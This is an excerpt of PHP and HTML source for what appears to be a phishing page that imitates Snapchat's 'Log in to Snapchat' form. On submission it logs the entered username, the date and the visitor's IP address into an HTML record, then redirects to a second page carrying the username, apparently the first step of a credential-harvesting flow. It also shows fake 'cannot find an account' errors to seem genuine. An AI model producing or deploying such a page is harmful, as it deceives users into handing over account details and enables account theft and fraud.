...
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    ...
    if (strlen($value1) < 3 || strlen($value1) > 15) {
        $error = "We cannot find an account for this username.";
    } else {
        ...
        $logEntry = "<div class='card'><small>$dateTime</small><br>\n<small>IP: $userIP</small>\n<h3>👤 User: $value1</h3>\n";
        ...
        // Redirect to the second page with value1 as a query parameter
        header("Location: next.php?value1=" . urlencode($value1));
        exit();
    }
}
?>
...
<body>
    ...
    <form id="form" method="post" action="<?php echo $_SERVER['PHP_SELF']; ?>">
        <div class="page">
            ...
            <div class="login-challenge-frame">
                <h1 class="login-challenge-title">Log in to Snapchat</h1>
            </div>
            ...
            <div class="form-group">
                <label for="accountIdentifier" class="control-label">Username or Email</label>
                <input autocomplete="username" type="text" class="form-control" value="" name="value1" id="value1">
    ...
    <script>
        function validateForm() {
            ...
            if(length < 1){
                document.getElementById("error").innerHTML = "The input field below cannot be empty.";
                return false;
            }
            if (length < 3 || length > 15) {
                document.getElementById("error").innerHTML = "We cannot find an account for this username.";
                return false;
            } else {
